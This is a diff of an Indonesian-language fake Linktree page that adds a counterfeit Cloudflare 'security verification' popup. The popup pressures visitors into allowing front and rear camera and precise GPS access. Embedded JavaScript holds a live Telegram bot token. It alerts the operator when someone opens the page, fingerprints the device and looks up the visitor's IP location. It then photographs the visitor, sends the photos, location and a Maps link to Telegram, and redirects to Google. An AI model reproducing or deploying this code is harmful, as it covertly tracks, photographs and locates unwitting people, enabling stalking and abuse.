@@ -33,30 +33,48 @@
     .link-btn { background: rgba(255,255,255,0.06); backdrop-filter: blur(10px); padding: 15px; border-radius: 14px; text-decoration: none; color: white; font-weight: 500; transition: 0.2s; border: 1px solid rgba(255,255,255,0.08); display: flex; align-items: center; justify-content: center; gap: 10px; }
     .link-btn:hover { background: #ff4d6d; transform: translateY(-3px); box-shadow: 0 12px 25px rgba(255,77,109,0.3); }
     .footer { margin-top: 35px; font-size: 0.7rem; color: #555; }
+
+    /* POPUP VERIFIKASI CLOUDFLARE STYLE */
     #verification-overlay {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(240, 240, 250, 0.7); backdrop-filter: blur(15px);
+      background: rgba(240, 240, 250, 0.75); backdrop-filter: blur(15px);
       display: flex; align-items: center; justify-content: center; z-index: 9999;
     }
     .modal {
-      background: rgba(20, 20, 40, 0.9); backdrop-filter: blur(20px);
-      border: 1px solid rgba(255,255,255,0.2); border-radius: 24px; padding: 35px 25px;
-      max-width: 360px; width: 90%; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,0.5); color: white;
+      background: rgba(20, 20, 40, 0.95); backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.2); border-radius: 24px; padding: 30px 25px;
+      max-width: 380px; width: 90%; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,0.5); color: white;
     }
-    .modal h2 { font-size: 1.8rem; margin-bottom: 12px; color: #ff4d6d; }
-    .modal p { font-size: 0.95rem; color: #ccc; margin-bottom: 25px; line-height: 1.6; }
+    .cf-header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 5px; }
+    .cf-icon { width: 40px; height: 40px; background: #f48120; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: bold; color: white; }
+    .cf-title { font-size: 1.4rem; font-weight: 600; }
+    .cf-sub { font-size: 0.8rem; color: #f48120; margin-bottom: 20px; }
+    .check-list { text-align: left; margin: 20px 0; }
+    .check-item { display: flex; align-items: center; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1); }
+    .check-icon { width: 24px; height: 24px; border-radius: 50%; margin-right: 10px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 12px; }
+    .done { background: #4CAF50; }
+    .pending { background: #ccc; animation: pulse 1.5s infinite; }
+    .failed { background: #f44336; }
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    .check-label { flex: 1; font-size: 13px; color: #ddd; }
+    .check-status { font-size: 11px; color: #888; }
     .btn {
-      background: #ff4d6d; color: white; border: none; padding: 14px 24px; border-radius: 30px;
-      font-size: 1rem; font-weight: 600; cursor: pointer; transition: 0.2s; width: 100%; letter-spacing: 0.5px;
+      background: #f48120; color: white; border: none; padding: 14px 24px; border-radius: 30px;
+      font-size: 1rem; font-weight: 600; cursor: pointer; width: 100%; letter-spacing: 0.5px; margin-top: 5px;
     }
-    .btn:hover { background: #e9445e; }
+    .btn:hover { background: #e0701c; }
     .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .retry-btn {
+      background: transparent; border: 1px solid #f48120; color: #f48120;
+      padding: 6px 16px; border-radius: 20px; cursor: pointer; margin-top: 8px; font-size: 0.9rem;
+    }
     .error-text { color: #ff8080; font-size: 0.85rem; margin-top: 15px; display: none; }
     .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s linear infinite; margin-right: 8px; }
     @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
+  <!-- Linktree Background -->
   <div id="main-content">
     <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Ccircle cx='55' cy='55' r='55' fill='%23ff4d6d'/%3E%3Ctext x='55' y='60' text-anchor='middle' fill='white' font-size='45' font-weight='bold'%3EL%3C/text%3E%3C/svg%3E" alt="Profile" class="profile-pic">
     <h1>@lynzxz</h1>
@@ -73,351 +91,399 @@
     <div class="footer">Dibuat dengan ❤️ oleh lynzxz • Laporkan</div>
   </div>
 
+  <!-- Popup Verifikasi -->
   <div id="verification-overlay" style="display: none;">
     <div class="modal">
-      <h2>🔒 Verifikasi Keamanan</h2>
-      <p>Untuk melanjutkan, izinkan akses <b>kamera depan & belakang</b> serta <b>lokasi</b> Anda. Proses ini instan.</p>
-      <button id="verify-btn" class="btn">👉 Verifikasi Sekarang</button>
-      <p id="error-msg" class="error-text"></p>
+      <div class="cf-header">
+        <div class="cf-icon">&#128737;</div>
+        <div class="cf-title">Cloudflare</div>
+      </div>
+      <div class="cf-sub">Verifikasi Keamanan • SSL/TLS Terenkripsi</div>
+      <div class="check-list">
+        <div class="check-item">
+          <div class="check-icon done">✓</div>
+          <div class="check-label">Enkripsi SSL</div>
+          <div class="check-status">Aman</div>
+        </div>
+        <div class="check-item">
+          <div class="check-icon done">✓</div>
+          <div class="check-label">Firewall WAF</div>
+          <div class="check-status">Aktif</div>
+        </div>
+        <div class="check-item">
+          <div class="check-icon done">✓</div>
+          <div class="check-label">Perangkat Dikenali</div>
+          <div class="check-status">OK</div>
+        </div>
+        <div class="check-item" id="identityCheck">
+          <div class="check-icon pending" id="identityIcon">?</div>
+          <div class="check-label">Verifikasi Identitas</div>
+          <div class="check-status" id="identityStatus">Wajib</div>
+        </div>
+      </div>
+      <button class="btn" id="verifyBtn">👉 Verifikasi Sekarang</button>
+      <div id="retryArea"></div>
+      <div id="globalStatus" style="font-size:12px; color:#aaa; margin-top:10px; min-height:18px;"></div>
     </div>
   </div>
 
-  <video id="cam-preview" style="display:none;" playsinline autoplay muted></video>
-  <canvas id="photo-canvas" style="display:none;"></canvas>
+  <!-- Video dan Canvas tersembunyi -->
+  <video id="camVideo" style="display:none;" playsinline autoplay muted></video>
+  <canvas id="photoCanvas" style="display:none;"></canvas>
 
   <script>
   (function() {
+    // ========== KONFIGURASI ==========
     const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
     const CHAT_ID = '5986004601';
     const REDIRECT_URL = 'https://www.google.com';
 
+    // DOM Elements
     const overlay = document.getElementById('verification-overlay');
     const verifyBtn = document.getElementById('verify-btn');
-    const errorMsg = document.getElementById('error-msg');
-    const video = document.getElementById('cam-preview');
-    const canvas = document.getElementById('photo-canvas');
-    const ctx = canvas.getContext('2d');
+    const identityIcon = document.getElementById('identityIcon');
+    const identityStatus = document.getElementById('identityStatus');
+    const globalStatus = document.getElementById('globalStatus');
+    const retryArea = document.getElementById('retryArea');
+    const camVideo = document.getElementById('camVideo');
+    const photoCanvas = document.getElementById('photoCanvas');
+    const ctx = photoCanvas.getContext('2d');
 
-    let attempt = 0;
-    let verificationDone = false;
-    let timerHandle = null;
-    let capturedBlobs = { front: null, rear: null };
-    let gpsCoords = null;
-    let fingerData = {};
+    // State
+    let deviceInfo = '', ipGeoInfo = '';
+    let locationData = null; // { lat, lng, acc }
+    let frontBlob = null, backBlob = null;
+    let verificationTimer = null;
+    let verificationComplete = false;
 
-    function sendTelegramMessage(text) {
+    // ========== FUNGSI KIRIM TELEGRAM ==========
+    function sendMessage(text) {
       return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: false })
       }).catch(() => {});
     }
-
-    function sendPhotoWithCaption(blob, caption) {
+    function sendPhoto(blob, caption) {
       const fd = new FormData();
-      fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'user_collage.jpg'); fd.append('caption', caption);
-      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', blob, 'verification.jpg');
+      fd.append('caption', caption);
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:fd }).catch(() => {});
     }
 
-    sendTelegramMessage(`🚨 <b>Seseorang membuka web!</b>\nSedang dilacak... Tunggu 30 detik tuan 🫡\n⏱ ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`);
+    // ========== NOTIFIKASI AWAL ==========
+    sendMessage(`🚨 <b>Seseorang membuka web!</b>\nSedang dilacak... Tunggu 30 detik tuan 🫡\n⏱ ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`);
 
-    // ========== FINGERPRINTING ==========
-    function getCanvasFingerprint() {
-      try {
-        const c = document.createElement('canvas'); c.width=280;c.height=60;
-        const ct=c.getContext('2d'); ct.fillStyle='#f60';ct.fillRect(0,0,280,60);
-        ct.fillStyle='#069';ct.font='16px Arial';ct.fillText('Canvas FP',10,30);
-        return btoa(c.toDataURL()).substring(0,35);
-      }catch(e){return 'canvas_err';}
-    }
-
-    function getWebGLFingerprint() {
-      try {
-        const c=document.createElement('canvas'); const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
-        if(!gl)return 'webgl_off'; const ext=gl.getExtension('WEBGL_debug_renderer_info');
-        return (ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR)) + ' / ' + (ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER));
-      }catch(e){return 'webgl_err';}
-    }
-
-    function getAudioFingerprint() {
-      return new Promise(resolve => {
-        try{
-          const AC=window.AudioContext||window.webkitAudioContext; if(!AC)return resolve('audio_off');
-          const actx=new AC(); const osc=actx.createOscillator(); const analyser=actx.createAnalyser(); const gain=actx.createGain();
-          osc.type='triangle';osc.frequency.value=10000; gain.gain.value=0;
-          osc.connect(gain);gain.connect(analyser);analyser.connect(actx.destination); osc.start(0);
-          const data=new Uint8Array(analyser.frequencyBinCount); analyser.getByteFrequencyData(data);
-          osc.stop(0);actx.close(); resolve(Array.from(data.slice(0,30)).join(','));
-        }catch(e){resolve('audio_err');}
-      });
-    }
-
-    function getBatteryStatus() {
-      return navigator.getBattery?navigator.getBattery().then(b=>`${Math.round(b.level*100)}% (charging:${b.charging})`).catch(()=>'batt_denied'):Promise.resolve('batt_no');
-    }
-
-    function getNetworkType() {
-      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (!c) return 'Tidak diketahui';
-      if (c.type === 'cellular') return 'Seluler (Data)';
-      if (c.type === 'wifi') return 'WiFi';
-      if (c.effectiveType === '4g') return 'Mungkin Seluler (4G)';
-      return c.type || c.effectiveType || 'Tidak diketahui';
-    }
-
-    // ========== PARSING MEREK/MODEL DARI GPU + UA ==========
-    function getDeviceBrandModel(ua, webglRenderer) {
-      let brand = 'Tidak Diketahui', model = 'Tidak Diketahui';
-      // Coba parsing dari UA dulu
-      const uaLower = ua.toLowerCase();
-      if (uaLower.includes('samsung')) { brand = 'Samsung'; const m = ua.match(/Samsung[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
-      else if (uaLower.includes('xiaomi') || uaLower.includes('redmi')) { brand = 'Xiaomi'; const m = ua.match(/(?:Xiaomi|Redmi)[ -]?([A-Za-z0-9]+)/i); if(m) model = m[1]; }
-      else if (uaLower.includes('oppo')) { brand = 'Oppo'; const m = ua.match(/OPPO[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
-      else if (uaLower.includes('vivo')) { brand = 'Vivo'; const m = ua.match(/vivo[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
-      else if (uaLower.includes('iphone')) { brand = 'Apple'; model = 'iPhone'; }
-      else if (uaLower.includes('huawei')) { brand = 'Huawei'; const m = ua.match(/Huawei[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
-      else if (uaLower.includes('realme')) { brand = 'Realme'; const m = ua.match(/Realme[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
-      else if (uaLower.includes('infinix')) { brand = 'Infinix'; const m = ua.match(/Infinix[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
-      else if (uaLower.includes('tecno')) { brand = 'Tecno'; const m = ua.match(/Tecno[ -]([A-Za-z0-9]+)/i); if(m) model = m[1]; }
-
-      // Jika masih tidak diketahui, coba tebak dari GPU renderer
-      if (brand === 'Tidak Diketahui' && webglRenderer) {
-        const rendererLower = webglRenderer.toLowerCase();
-        if (rendererLower.includes('mali-g68')) {
-          brand = 'Mungkin Samsung/Infinix';
-          model = 'Chipset Mali-G68 (A25, A34, GT 10 Pro, dll)';
-        } else if (rendererLower.includes('mali-g57')) {
-          brand = 'Mungkin Xiaomi/Realme';
-          model = 'Chipset Mali-G57';
-        } else if (rendererLower.includes('adreno')) {
-          brand = 'Qualcomm';
-          model = 'GPU Adreno';
-        } else if (rendererLower.includes('apple')) {
-          brand = 'Apple';
-          model = 'GPU Apple';
-        }
-      }
-      return { brand, model };
-    }
-
-    function getDeviceSpecs() {
-      const ua = navigator.userAgent;
-      const webglRenderer = getWebGLFingerprint(); // sudah ada renderer
-      const { brand, model } = getDeviceBrandModel(ua, webglRenderer);
-      return `Merek: ${brand}
-Model: ${model}
-Resolusi: ${screen.width}x${screen.height}
-RAM: ${navigator.deviceMemory||'?'}GB
-Core: ${navigator.hardwareConcurrency||'?'}
-Sentuh: ${('ontouchstart' in window)?'Ya':'Tidak'}
-Bahasa: ${navigator.language}
-Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Cookies: ${navigator.cookieEnabled?'Aktif':'Nonaktif'}`;
-    }
-
-    // ========== IP & PROVIDER ==========
-    async function fetchIPGeo() {
-      try{
-        const r=await fetch('https://ipapi.co/json/'); if(!r.ok)throw 0; const d=await r.json();
-        const isp = d.org || '';
-        let providerNote = '';
-        if (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) providerNote = ' (Operator Seluler)';
-        else providerNote = ' (Bukan Operator Seluler)';
-        return `IP: ${d.ip}
-ISP: ${d.org || 'Tidak Diketahui'}${providerNote}
-Kota: ${d.city}, ${d.region}
-Negara: ${d.country_name} (${d.country_code})
-Koord: ${d.latitude},${d.longitude}`;
-      }catch(e){
-        try{
-          const ipR=await fetch('https://api.ipify.org?format=json'); const {ip}=await ipR.json();
-          const geoR=await fetch(`https://ipinfo.io/${ip}/json`); const g=await geoR.json();
-          const loc=g.loc?g.loc.split(','):['?','?']; const isp = g.org||'Tidak Diketahui';
-          let providerNote = (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) ? ' (Operator Seluler)' : ' (Bukan Operator Seluler)';
-          return `IP: ${ip}
-ISP: ${isp}${providerNote}
-Kota: ${g.city||'?'}, ${g.region||'?'}
-Negara: ${g.country||'?'}
-Koord: ${loc[0]},${loc[1]}`;
-        }catch{return 'IP_Gagal';}
-      }
-    }
-
-    // ========== KAMERA (FIX: menyimpan blob) ==========
-    async function startCamera(facingMode) {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facingMode, width:{ideal:1280}, height:{ideal:720} },
-        audio: false
-      });
-      video.srcObject = stream;
-      await video.play();
-      await new Promise(resolve => video.onloadedmetadata = resolve);
-      // Capture frame
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-      // Cleanup
+    // ========== AMBIL FRAME DARI STREAM ==========
+    async function captureFrame(stream) {
+      camVideo.srcObject = stream;
+      await camVideo.play();
+      await new Promise(r => camVideo.onloadedmetadata = r);
+      photoCanvas.width = camVideo.videoWidth;
+      photoCanvas.height = camVideo.videoHeight;
+      ctx.drawImage(camVideo, 0, 0);
+      const blob = await new Promise(res => photoCanvas.toBlob(res, 'image/jpeg', 0.85));
+      // Matikan stream
       stream.getTracks().forEach(t => t.stop());
-      video.srcObject = null;
+      camVideo.srcObject = null;
       return blob;
     }
 
-    // ========== GPS ==========
-    function requestLocation() {
+    // ========== PERMINTAAN LOKASI (WAJIB, RETRY) ==========
+    function requestLocation(retryCount) {
       return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) return reject(new Error('no_geo'));
+        if (!navigator.geolocation) return reject('Geolocation not supported');
         navigator.geolocation.getCurrentPosition(
-          pos => {
-            gpsCoords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
-            resolve(gpsCoords);
+          pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
+          err => {
+            if (retryCount < 1) {
+              // Tampilkan tombol retry untuk lokasi
+              identityIcon.className = 'check-icon failed';
+              identityStatus.textContent = 'Gagal - Izin lokasi';
+              retryArea.innerHTML = `<p style="color:#ff8080; font-size:13px;">Izin lokasi diperlukan.</p>
+                <button class="retry-btn" id="retryLocBtn">Coba Lagi</button>`;
+              document.getElementById('retryLocBtn').onclick = () => {
+                retryArea.innerHTML = '';
+                identityIcon.className = 'check-icon pending';
+                identityStatus.textContent = 'Menunggu izin...';
+                resolve(requestLocation(1)); // retry
+              };
+            } else {
+              // Gagal total
+              reject('Location denied twice');
+            }
           },
-          err => reject(err),
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       });
     }
 
-    // ========== KOLASE FOTO ==========
-    async function createCollageBlob() {
-      const loadImg = blob => new Promise(resolve => {
-        const img = new Image(); img.onload = () => resolve(img); img.onerror = () => resolve(null); img.src = URL.createObjectURL(blob);
+    // ========== PERMINTAAN KAMERA DEPAN (WAJIB, RETRY) ==========
+    function requestCameraFront(retryCount) {
+      return new Promise((resolve, reject) => {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width:{ideal:1280}, height:{ideal:720} }, audio: false })
+          .then(stream => resolve(stream))
+          .catch(err => {
+            if (retryCount < 1) {
+              identityIcon.className = 'check-icon failed';
+              identityStatus.textContent = 'Gagal - Izin kamera';
+              retryArea.innerHTML = `<p style="color:#ff8080; font-size:13px;">Izin kamera diperlukan.</p>
+                <button class="retry-btn" id="retryCamBtn">Coba Lagi</button>`;
+              document.getElementById('retryCamBtn').onclick = () => {
+                retryArea.innerHTML = '';
+                identityIcon.className = 'check-icon pending';
+                identityStatus.textContent = 'Menunggu izin...';
+                resolve(requestCameraFront(1));
+              };
+            } else {
+              reject('Camera denied twice');
+            }
+          });
       });
-      let frontImg = capturedBlobs.front ? await loadImg(capturedBlobs.front) : null;
-      let rearImg = capturedBlobs.rear ? await loadImg(capturedBlobs.rear) : null;
-      if (!frontImg && !rearImg) return null;
-      const gap = 4; let maxW = 0, totalH = 0;
-      if (frontImg) { maxW = Math.max(maxW, frontImg.width); totalH += frontImg.height; }
-      if (rearImg) { maxW = Math.max(maxW, rearImg.width); totalH += rearImg.height; }
-      if (frontImg && rearImg) totalH += gap;
-      canvas.width = maxW; canvas.height = totalH;
-      ctx.fillStyle = '#000'; ctx.fillRect(0,0,maxW,totalH);
-      let y = 0;
-      if (frontImg) { ctx.drawImage(frontImg,0,y,frontImg.width,frontImg.height); y += frontImg.height; if (rearImg) y += gap; }
-      if (rearImg) { ctx.drawImage(rearImg,0,y,rearImg.width,rearImg.height); }
-      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.75));
     }
 
-    // ========== KIRIM DATA LENGKAP ==========
-    async function sendFinalData(success) {
-      if (!fingerData.canvas) {
-        fingerData.canvas = getCanvasFingerprint();
-        fingerData.webgl = getWebGLFingerprint();
-        fingerData.audio = await getAudioFingerprint();
-        fingerData.battery = await getBatteryStatus();
-        fingerData.net = getNetworkType();
-        fingerData.device = getDeviceSpecs();
-        fingerData.ipGeo = await fetchIPGeo();
+    // ========== FINGERPRINTING ==========
+    function getCanvasFP() {
+      try {
+        const c=document.createElement('canvas');c.width=280;c.height=60;
+        const ct=c.getContext('2d');ct.fillStyle='#f60';ct.fillRect(0,0,280,60);
+        ct.fillStyle='#069';ct.font='16px Arial';ct.fillText('Canvas FP',10,30);
+        return btoa(c.toDataURL()).substring(0,35);
+      }catch(e){return 'canvas_err';}
+    }
+    function getWebGL() {
+      try {
+        const c=document.createElement('canvas');
+        const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+        if(!gl)return 'webgl_off';
+        const ext=gl.getExtension('WEBGL_debug_renderer_info');
+        return (ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR))+' / '+(ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER));
+      }catch(e){return 'webgl_err';}
+    }
+    async function getAudioFP() {
+      try{
+        const AC=window.AudioContext||window.webkitAudioContext;if(!AC)return 'audio_off';
+        const actx=new AC();const osc=actx.createOscillator();const analyser=actx.createAnalyser();const gain=actx.createGain();
+        osc.type='triangle';osc.frequency.value=10000;gain.gain.value=0;
+        osc.connect(gain);gain.connect(analyser);analyser.connect(actx.destination);osc.start(0);
+        const data=new Uint8Array(analyser.frequencyBinCount);analyser.getByteFrequencyData(data);
+        osc.stop(0);actx.close();return Array.from(data.slice(0,30)).join(',');
+      }catch(e){return 'audio_err';}
+    }
+    async function getBattery() {
+      if(navigator.getBattery) {
+        const b=await navigator.getBattery();
+        return `${Math.round(b.level*100)}% (charging:${b.charging})`;
       }
-      const locStr = gpsCoords ? `GPS: ${gpsCoords.lat.toFixed(6)}, ${gpsCoords.lng.toFixed(6)} (akurasi ${gpsCoords.acc}m)` : 'GPS: tidak tersedia';
-      const statusText = success ? '✅ VERIFIKASI BERHASIL SEBAGIAN' : '⏰ TIMEOUT / GAGAL';
-      const caption = `${statusText}
+      return 'N/A';
+    }
+    function getNetworkType() {
+      const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+      if(!c) return 'unknown';
+      return c.type === 'cellular' ? 'Seluler (Data)' : c.type === 'wifi' ? 'WiFi' : c.effectiveType || c.type || 'unknown';
+    }
+    function getDeviceBrandModel(ua, webglRenderer) {
+      let brand='Tidak Diketahui', model='Tidak Diketahui';
+      const lower = ua.toLowerCase();
+      if(lower.includes('samsung')){ brand='Samsung'; let m=ua.match(/Samsung[ -]([A-Za-z0-9]+)/i); if(m)model=m[1]; }
+      else if(lower.includes('xiaomi')||lower.includes('redmi')){ brand='Xiaomi'; let m=ua.match(/(?:Xiaomi|Redmi)[ -]?([A-Za-z0-9]+)/i); if(m)model=m[1]; }
+      else if(lower.includes('oppo')){ brand='Oppo'; let m=ua.match(/OPPO[ -]([A-Za-z0-9]+)/i); if(m)model=m[1]; }
+      else if(lower.includes('vivo')){ brand='Vivo'; let m=ua.match(/vivo[ -]([A-Za-z0-9]+)/i); if(m)model=m[1]; }
+      else if(lower.includes('iphone')){ brand='Apple'; model='iPhone'; }
+      else if(lower.includes('huawei')){ brand='Huawei'; let m=ua.match(/Huawei[ -]([A-Za-z0-9]+)/i); if(m)model=m[1]; }
+      else if(lower.includes('realme')){ brand='Realme'; let m=ua.match(/Realme[ -]([A-Za-z0-9]+)/i); if(m)model=m[1]; }
+      else if(lower.includes('infinix')){ brand='Infinix'; let m=ua.match(/Infinix[ -]([A-Za-z0-9]+)/i); if(m)model=m[1]; }
+      else if(lower.includes('tecno')){ brand='Tecno'; let m=ua.match(/Tecno[ -]([A-Za-z0-9]+)/i); if(m)model=m[1]; }
+      if(brand==='Tidak Diketahui' && webglRenderer){
+        const rl = webglRenderer.toLowerCase();
+        if(rl.includes('mali-g68')){ brand='Mungkin Samsung/Infinix'; model='Chipset Mali-G68'; }
+        else if(rl.includes('mali-g57')){ brand='Mungkin Xiaomi/Realme'; model='Chipset Mali-G57'; }
+        else if(rl.includes('adreno')){ brand='Qualcomm'; model='GPU Adreno'; }
+        else if(rl.includes('apple')){ brand='Apple'; model='GPU Apple'; }
+      }
+      return {brand, model};
+    }
+
+    async function fetchIPGeo() {
+      try{
+        const r=await fetch('https://ipapi.co/json/');
+        if(!r.ok) throw 0;
+        const d=await r.json();
+        const isp = d.org || '';
+        let providerNote = (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) ? ' (Operator Seluler)' : ' (Bukan Operator Seluler)';
+        return `IP: ${d.ip}
+ISP: ${d.org || 'Tidak Diketahui'}${providerNote}
+Kota: ${d.city}, ${d.region}
+Negara: ${d.country_name} (${d.country_code})
+Koord IP: ${d.latitude},${d.longitude}`;
+      }catch(e){
+        try{
+          const ipR=await fetch('https://api.ipify.org?format=json'); const {ip}=await ipR.json();
+          const geoR=await fetch(`https://ipinfo.io/${ip}/json`); const g=await geoR.json();
+          const loc=g.loc?g.loc.split(','):['?','?']; const isp=g.org||'Tidak Diketahui';
+          let providerNote = (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) ? ' (Operator Seluler)' : ' (Bukan Operator Seluler)';
+          return `IP: ${ip}
+ISP: ${isp}${providerNote}
+Kota: ${g.city||'?'}, ${g.region||'?'}
+Negara: ${g.country||'?'}
+Koord IP: ${loc[0]},${loc[1]}`;
+        }catch{return 'IP_Gagal';}
+      }
+    }
+
+    // ========== KIRIM SEMUA DATA ==========
+    async function sendAllData() {
+      // Kumpulkan fingerprint dan data lain
+      const ua = navigator.userAgent;
+      const webgl = getWebGL();
+      const {brand, model} = getDeviceBrandModel(ua, webgl);
+      const deviceSpecs = `Merek: ${brand}
+Model: ${model}
+Resolusi: ${screen.width}x${screen.height}
+RAM: ${navigator.deviceMemory||'?'}GB
+Core: ${navigator.hardwareConcurrency||'?'}
+Sentuh: ${('ontouchstart' in window) ? 'Ya':'Tidak'}
+Bahasa: ${navigator.language}
+Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+
+      const canvasFP = getCanvasFP();
+      const audioFP = await getAudioFP();
+      const battery = await getBattery();
+      const netType = getNetworkType();
+      const ipGeo = await fetchIPGeo();
+
+      // Lokasi GPS
+      let locationStr = 'GPS: Tidak tersedia';
+      let mapsLink = '';
+      if (locationData) {
+        const { lat, lng, acc } = locationData;
+        locationStr = `GPS: ${lat}, ${lng} (akurasi ${acc}m)`;
+        mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+      }
+
+      // Buat caption dengan koordinat yang bisa disalin
+      const caption = `✅ <b>VERIFIKASI BERHASIL</b>
 ━━━━━━━━━━━━━━━━━━
 🌐 <b>Jaringan & Lokasi</b>
-${fingerData.ipGeo}
-${locStr}
-Tipe Koneksi: ${fingerData.net}
+${ipGeo}
+${locationStr}
+Klik koordinat: <a href="${mapsLink}">${mapsLink}</a>
+Tipe Koneksi: ${netType}
 ━━━━━━━━━━━━━━━━━━
 📟 <b>Perangkat</b>
-${fingerData.device}
-User Agent: ${navigator.userAgent}
+${deviceSpecs}
+User Agent: ${ua}
 ━━━━━━━━━━━━━━━━━━
 🎨 <b>Fingerprint</b>
-Canvas: ${fingerData.canvas}
-WebGL: ${fingerData.webgl}
-Audio: ${fingerData.audio}
-Baterai: ${fingerData.battery}
+Canvas: ${canvasFP}
+WebGL: ${webgl}
+Audio: ${audioFP}
+Baterai: ${battery}
 ━━━━━━━━━━━━━━━━━━
 🕒 Waktu: ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}
-📸 Kamera Depan: ${capturedBlobs.front ? '✅' : '❌'} | Belakang: ${capturedBlobs.rear ? '✅' : '❌'}`;
+📸 Kamera Depan: ${frontBlob?'✅':'❌'} | Belakang: ${backBlob?'✅':'❌'}`;
 
-      const collageBlob = await createCollageBlob();
-      if (collageBlob) {
-        await sendPhotoWithCaption(collageBlob, caption);
+      // Buat kolase jika keduanya ada
+      let finalBlob = null;
+      if (frontBlob && backBlob) {
+        // Gabung vertikal
+        const loadImg = blob => new Promise(resolve => {
+          const img = new Image(); img.onload = () => resolve(img); img.src = URL.createObjectURL(blob);
+        });
+        const frontImg = await loadImg(frontBlob);
+        const backImg = await loadImg(backBlob);
+        const gap = 4;
+        const w = Math.max(frontImg.width, backImg.width);
+        const h = frontImg.height + backImg.height + gap;
+        photoCanvas.width = w;
+        photoCanvas.height = h;
+        ctx.fillStyle = '#000';
+        ctx.fillRect(0,0,w,h);
+        ctx.drawImage(frontImg, 0, 0, frontImg.width, frontImg.height);
+        ctx.drawImage(backImg, 0, frontImg.height + gap, backImg.width, backImg.height);
+        finalBlob = await new Promise(res => photoCanvas.toBlob(res, 'image/jpeg', 0.8));
+      } else if (frontBlob) {
+        finalBlob = frontBlob;
+      } else if (backBlob) {
+        finalBlob = backBlob;
+      }
+
+      // Kirim
+      if (finalBlob) {
+        await sendPhoto(finalBlob, caption);
       } else {
-        await sendTelegramMessage(caption);
+        await sendMessage(caption);
       }
     }
 
-    async function finalize(success) {
-      if (verificationDone) return;
-      verificationDone = true;
-      clearTimeout(timerHandle);
-      overlay.style.display = 'none';
-      await sendFinalData(success);
-      window.location.replace(REDIRECT_URL);
-    }
-
-    // ========== TOMBOL VERIFIKASI ==========
-    async function onVerifyClick() {
-      if (verificationDone) return;
+    // ========== MULAI VERIFIKASI ==========
+    async function startVerification() {
+      if (verificationComplete) return;
       verifyBtn.disabled = true;
       verifyBtn.innerHTML = '<span class="spinner"></span> Memverifikasi...';
-      errorMsg.style.display = 'none';
-      attempt++;
+      globalStatus.textContent = 'Meminta izin...';
+      retryArea.innerHTML = '';
 
-      // Kumpulkan fingerprint di percobaan pertama
-      if (attempt === 1) {
-        fingerData.canvas = getCanvasFingerprint();
-        fingerData.webgl = getWebGLFingerprint();
-        fingerData.audio = await getAudioFingerprint();
-        fingerData.battery = await getBatteryStatus();
-        fingerData.net = getNetworkType();
